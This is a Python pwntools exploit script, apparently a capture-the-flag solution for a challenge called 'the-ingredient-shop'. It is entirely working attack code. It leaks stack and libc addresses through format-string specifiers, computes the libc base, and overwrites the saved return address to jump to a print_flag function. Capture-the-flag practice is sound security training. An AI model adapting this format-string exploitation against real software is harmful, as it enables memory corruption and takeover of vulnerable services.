from pwn import *

context(arch='amd64',terminal=['tmux','new-window'])

local = False
fname = './shop'

libc=ELF('/glibc/2.34/64/lib/libc.so.6')
e = ELF(fname)
magic = 0xda801

r = process(fname, env={'LD_PRELOAD': '/glibc/2.34/64/lib/libc.so.6'}) if local else remote("the-ingredient-shop-8c8247928c223672.challs.brunnerne.xyz", 443, ssl=True)

def overwrite_addr(addr,content):
	payload = fmtstr_payload(8, {addr: content}, write_size='short')
	r.sendline(payload)

if __name__ == '__main__':
	log.info(r.recvuntil('3) exit\n'))
	print('--------')
	exp_str=''	
	#gdb.attach(r)
	r.sendline('%43$lx')	
	log.info(r.recvline())
	print_flag = int('0x'+r.recvline().decode().strip(),16)
	print_flag -= 436
	log.info(hex(print_flag))
	
	log.info(r.recvuntil('3) exit\n'))
	r.sendline('%45$lx')
	log.info(r.recvline())
	lib_start_main = int('0x'+r.recvline().decode().strip(),16)-109
	log.info(hex(lib_start_main))
	base_addr = lib_start_main-libc.sym['__libc_start_call_main']
	log.info(hex(base_addr))
	magic+=base_addr
	log.info(hex(magic))
	log.info(r.recvuntil('3) exit\n'))
	r.sendline('%42$lx')
	log.info(r.recvline())
	ra = int('0x'+r.recvline().decode().strip(),16)-8
	log.info(hex(ra))
	

	#gdb.attach(r)
	print(hex(print_flag))
	overwrite_addr(ra,print_flag)


	r.interactive()

